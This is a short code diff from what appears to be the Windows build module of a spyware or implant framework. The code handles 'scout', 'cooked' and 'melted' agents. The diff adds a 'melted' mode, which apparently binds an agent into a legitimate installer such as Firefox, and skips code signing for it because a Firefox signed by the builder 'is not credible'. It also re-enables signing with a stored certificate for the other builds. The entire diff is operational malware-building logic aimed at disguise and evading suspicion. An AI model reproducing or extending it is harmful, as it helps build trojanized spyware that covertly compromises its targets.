@@ -155,11 +155,12 @@ class BuildWindows < Build
     @bit64 = (params['bit64'] == false) ? false : true
     @codec = (params['codec'] == false) ? false : true
     @scout = (params['scout'] == false) ? false : true
+    @melted = params['input'] ? true : false
 
     # choose the correct melting mode
     melting_mode = :silent
     melting_mode = :cooked if @cooked
-    melting_mode = :melted if params['input']
+    melting_mode = :melted if @melted
 
     # change the icon of the exec accordingly to the name
     customize_scout(@factory.confkey) if @scout
@@ -186,10 +187,11 @@ class BuildWindows < Build
     trace :debug, "Build: signing: #{params}"
 
     # don't sign cooked file (its not a valid PE)
-    return if @cooked
+    # don't sign melted files (firefox signed by us is not credible)
+    return if @cooked or @melted
 
     # perform the signature
-    #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
   end
 
   def pack(params)
